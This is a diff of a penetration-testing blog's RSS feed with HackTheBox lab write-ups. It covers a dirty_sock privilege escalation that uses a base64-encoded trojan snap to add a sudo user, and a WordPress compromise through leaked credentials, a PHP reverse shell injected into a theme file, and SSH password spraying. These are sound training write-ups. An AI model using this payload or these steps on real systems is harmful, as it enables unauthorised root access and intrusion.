+Date: Tue, <span class="m">30</span> Mar <span class="m">2021</span> 16:31:56 GMT
+Content-Length: <span class="m">119</span>
+
+<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;error&#34;</span>,<span class="s2">&#34;status-code&#34;</span>:401,<span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;Unauthorized&#34;</span>,<span class="s2">&#34;result&#34;</span>:<span class="o">{</span><span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;access denied&#34;</span>,<span class="s2">&#34;kind&#34;</span>:<span class="s2">&#34;login-required&#34;</span><span class="o">}}</span>
+</code></pre></div><p>The unauthorized message was caused by <code>SocketUser</code> and <code>SocketGroup</code> in <code>/lib/systemd/system/snapd.socket</code> which is already specified to <code>root</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon /<span class="o">]</span>$ cat /lib/systemd/system/snapd.socket
+<span class="o">[</span>Unit<span class="o">]</span>
+<span class="nv">Description</span><span class="o">=</span>Socket activation <span class="k">for</span> snappy daemon
+
+<span class="o">[</span>Socket<span class="o">]</span>
+<span class="nv">ListenStream</span><span class="o">=</span>/run/snapd.socket
+<span class="nv">ListenStream</span><span class="o">=</span>/run/snapd-snap.socket
+<span class="nv">SocketMode</span><span class="o">=</span><span class="m">0666</span> 
+<span class="c1"># these are the defaults, but can&#39;t hurt to specify them anyway:</span>
+<span class="nv">SocketUser</span><span class="o">=</span>root
+<span class="nv">SocketGroup</span><span class="o">=</span>root
+
+<span class="o">[</span>Install<span class="o">]</span>
+<span class="nv">WantedBy</span><span class="o">=</span>sockets.target
+</code></pre></div><p>Now that I couldn&rsquo;t run the exploit script as root with sudo, but one thing I can do is steal the payload (trojan snap code) from exploit and revert it back to snap package.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ python3 -c <span class="s2">&#34;print(&#39;&#39;&#39;
+</span><span class="s2">&gt; aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+</span><span class="s2">&gt; /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+</span><span class="s2">&gt; ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+</span><span class="s2">&gt; TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+</span><span class="s2">&gt; T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+</span><span class="s2">&gt; Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+</span><span class="s2">&gt; ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+</span><span class="s2">&gt; ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+</span><span class="s2">&gt; L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+</span><span class="s2">&gt; b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+</span><span class="s2">&gt; rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+</span><span class="s2">&gt; rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+</span><span class="s2">&gt; AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+</span><span class="s2">&gt; XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+</span><span class="s2">&gt; RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+</span><span class="s2">&gt; AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;+ &#39;A&#39; * 4256 + &#39;==&#39;)&#34;</span> <span class="p">|</span> base64 -d &gt; malicious.snap
+<span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ file malicious.snap
+file malicious.snap
+malicious.snap: Squashfs filesystem, little endian, version 4.0, <span class="m">910</span> bytes, <span class="m">7</span> inodes, blocksize: <span class="m">131072</span> bytes, created: Sat Feb  <span class="m">2</span> 23:00:32 <span class="m">2019</span>
+</code></pre></div><p>The package now can be installed with  <code>--devmode</code> option to skip digital signatures check. If the exploit success, there will be a new user added called <code>dirty_sock</code>  (default from the payload).</p>
+<pre><code>[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install --devmode malicious.snap 
+dirty-sock 0.1 installed
+</code></pre><p>And the user is there.</p>
+<pre><code>[brucetherealadmin@armageddon shm]$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
+</code></pre><p>Now I can switch to that user using a password of <code>dirty_sock</code> and run <code>sudo su</code> to obtain a root shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ su dirty_sock
+Password: 
+<span class="o">[</span>dirty_sock@armageddon shm<span class="o">]</span>$ sudo su
+
+We trust you have received the usual lecture from the <span class="nb">local</span> System
+Administrator. It usually boils down to these three things:
+
+    <span class="c1">#1) Respect the privacy of others.</span>
+    <span class="c1">#2) Think before you type.</span>
+    <span class="c1">#3) With great power comes great responsibility.</span>
+
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> dirty_sock: 
+<span class="o">[</span>root@armageddon shm<span class="o">]</span><span class="c1"># ifconfig</span>
+ens192: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
+        inet 10.129.92.110  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 fe80::7edc:a185:87bc:5935  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
+        inet6 fe80::7648:5ea1:5371:b3b5  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
+        inet6 fe80::ef75:a96e:3c27:e78b  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
+        ether 00:50:56:b9:41:c7  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets <span class="m">9191</span>  bytes <span class="m">732392</span> <span class="o">(</span>715.2 KiB<span class="o">)</span>
+        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
+        TX packets <span class="m">1149</span>  bytes <span class="m">188885</span> <span class="o">(</span>184.4 KiB<span class="o">)</span>
+        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></li>
+<li></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Active</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
@@ -1002,370 +1368,6 @@ bash-4.4# id
 <h2 id="references">Reference(s)</h2>
 <ul>
 <li><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Spectra</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
-      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
-      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&amp;rsquo;m able to inject a PHP code into a theme file to get a foothold on the system.</description>
-      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Internal enumeration finds an auto-login password and the password is reused by the user. The user has sudo privileges on <code>initctl</code>, which can be leveraged to get a root shell.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>Exploiting WordPress</li>
-<li>Command injection</li>
-<li>Exploiting sudo privileges on initctl</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Nmap</li>
-<li>CrackMapExec</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-15 10:10 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.229
-Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.052s latency<span class="o">)</span>.
-Not shown: <span class="m">65532</span> closed ports
-Reason: <span class="m">65532</span> resets
-PORT     STATE SERVICE REASON         VERSION
-22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.17.4
-3306/tcp open  mysql   syn-ack ttl <span class="m">63</span> MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 123.14 seconds
-</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
-<p>Running a script scan didn&rsquo;t find any interesting information.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
-<p>The site appears to be under development.</p>
-<p><img class="img-container" src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  />
-</p>
-<p>Inspecting page source discovers a hostname and two directories:</p>
-<ul>
-<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
-<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
-</ul>
-<p><img class="img-container" src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  />
-</p>
-<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
-</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
-$ curl -s http://spectra.htb/ <span class="p">|</span> wc -c
-<span class="m">283</span>
-→ root@kali «~» «10.10.14.9» 
-$ curl -s http://10.10.10.229 <span class="p">|</span> wc -c
-<span class="m">283</span>
-</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
-<p><img class="img-container" src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  />
-</p>
-<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
-<p><img class="img-container" src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  />
-</p>
-<p>Removing <code>index.php</code> from URL, reveals that this page has directory listing enabled.</p>
-<p><img class="img-container" src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  />
-</p>
-<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ curl http://spectra.htb/testing/wp-config.php.save
-&lt;?php
-...&lt;SNIP&gt;...
-
-define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
-
-/** MySQL database username */
-define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;devtest&#39;</span> <span class="o">)</span><span class="p">;</span>
-
-/** MySQL database password */
-define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;devteam01&#39;</span> <span class="o">)</span><span class="p">;</span>
-
-/** MySQL hostname */
-define<span class="o">(</span> <span class="s1">&#39;DB_HOST&#39;</span>, <span class="s1">&#39;localhost&#39;</span> <span class="o">)</span><span class="p">;</span>
-...&lt;SNIP&gt;...
-</code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-nginx">Shell as nginx</h3>
-<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
-<p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
-<p><img class="img-container" src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  />
-</p>
-<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
-<p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
-<p><img class="img-container" src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  />
-</p>
-<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
-<p><img class="img-container" src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  />
-</p>
-<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
-<p><img class="img-container" src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  />
-</p>
-<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
-</code></pre></div><p>On my listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ nc -nvlp <span class="m">9001</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
-connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">35166</span>
-Linux spectra 5.4.66+ <span class="c1">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
- 09:14:42 up 10:53,  <span class="m">0</span> users,  load average: 0.02, 0.04, 0.00
-USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
-<span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
-$ hostname
-spectra
-</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
-<p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ which python3
-which: no python3 in <span class="o">((</span>null<span class="o">))</span>
-$ ls /usr/bin/ <span class="p">|</span> grep python 
-python
-python-config
-python-wrapper
-python2
-python2.7
-python3
-python3.6
-python3.6m
-$ /usr/bin/python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-nginx@spectra / $ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-nginx@spectra / $ ^Z
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> suspended  nc -nvlp <span class="m">9001</span>
-→ root@kali «spectra» «10.10.14.21» 
-$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> continued  nc -nvlp <span class="m">9001</span>
-
-nginx@spectra / $ 
-</code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
-<span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nv">USER</span><span class="o">=</span>nginx
-<span class="nv">PWD</span><span class="o">=</span>/
-<span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
-<span class="nv">HOME</span><span class="o">=</span>/home/nginx
-<span class="nv">_</span><span class="o">=</span>/usr/bin/env
-nginx@spectra / $ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/bin 
-nginx@spectra / $ which python
-/usr/local/bin/python
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-katie">Shell as katie</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>There are 4 users with login shell in this machine.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd <span class="p">|</span> grep sh$  
-root:x:0:0:root:/root:/bin/bash
-chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
-nginx:x:20155:20156::/home/nginx:/bin/bash
-katie:x:20156:20157::/home/katie:/bin/bash
-</code></pre></div><p>Enumerating home directory shows the user flag is on  <code>katie</code>&rsquo;s home directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
-...&lt;SNIP&gt;...
-/home/katie:
-total <span class="m">8</span>
-drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
--r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
-...&lt;SNIP&gt;...
-</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
-/usr/local/share/nginx/html/main/wp-config.php
-/usr/local/share/nginx/html/testing/wp-config.php
-/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
-/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
-</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
-...&lt;SNIP&gt;...
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database <span class="k">for</span> WordPress */
-define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
-
-/** MySQL database username */
-define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
-
-/** MySQL database password */
-define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;development01&#39;</span> <span class="o">)</span><span class="p">;</span>
-...&lt;SNIP&gt;...
-</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
-<span class="c1"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
-<span class="c1"># Use of this source code is governed by a BSD-style license that can be</span>
-<span class="c1"># found in the LICENSE file.</span>
-description   <span class="s2">&#34;Automatic login at boot&#34;</span>
-author        <span class="s2">&#34;chromium-os-dev@chromium.org&#34;</span>
-<span class="c1"># After boot-complete starts, the login prompt is visible and is accepting</span>
-<span class="c1"># input.</span>
-start on started boot-complete
-script
-  <span class="nv">passwd</span><span class="o">=</span>
-  <span class="c1"># Read password from file. The file may optionally end with a newline.</span>
-  <span class="k">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do</span>
-    <span class="k">if</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-      <span class="nv">passwd</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
-      <span class="nb">break</span>
-    <span class="k">fi</span>
-  <span class="k">done</span>
-  <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-    <span class="nb">exit</span> <span class="m">0</span>
-  <span class="k">fi</span>
-...&lt;SNIP&gt;...
-</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
-<ul>
-<li><code>/mnt/stateful_partition/etc/autologin</code></li>
-<li><code>/etc/autologin</code></li>
-</ul>
-<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
-total <span class="m">4</span>
--rw-r--r-- <span class="m">1</span> root root <span class="m">19</span> Feb  <span class="m">3</span> 16:43 passwd
-nginx@spectra /opt $ cat /etc/autologin/passwd 
-SummerHereWeCome!!
-</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
-<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell. Within a few sec, it returns that <code>katie:SummerHereWeCome!!</code> are the valid credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
-SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.1
-SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
-SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
-SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:SummerHereWeCome!! Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
-SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
-SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
-SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>+<span class="o">]</span> katie:SummerHereWeCome!!
-</code></pre></div><p>I&rsquo;m able to login via SSH</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ ssh katie@10.10.10.229
-Password: 
-katie@spectra ~ $ id 
-<span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
-</code></pre></div><p>User flag is done here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
-total <span class="m">36</span>
-drwxr-xr-x <span class="m">5</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .
-drwxr-xr-x <span class="m">8</span> root  root  <span class="m">4096</span> Feb  <span class="m">2</span> 15:55 ..
-lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> Feb  <span class="m">2</span> 15:55 .bash_history -&gt; /dev/null
--rw-r--r-- <span class="m">1</span> katie katie  <span class="m">127</span> Dec <span class="m">22</span> 05:46 .bash_logout
--rw-r--r-- <span class="m">1</span> katie katie  <span class="m">204</span> Dec <span class="m">22</span> 05:46 .bash_profile
--rw-r--r-- <span class="m">1</span> katie katie  <span class="m">551</span> Dec <span class="m">22</span> 05:46 .bashrc
-drwx------ <span class="m">2</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .gnupg
-drwx------ <span class="m">3</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 .pki
-drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
--r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
-</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration-1">Internal Enumeration</h4>
-<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
-User katie may run the following commands on spectra:
-    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
-</code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
-    <span class="m">32121</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test6.conf
-    <span class="m">32123</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test7.conf
-    <span class="m">32109</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test3.conf
-    <span class="m">32112</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test4.conf
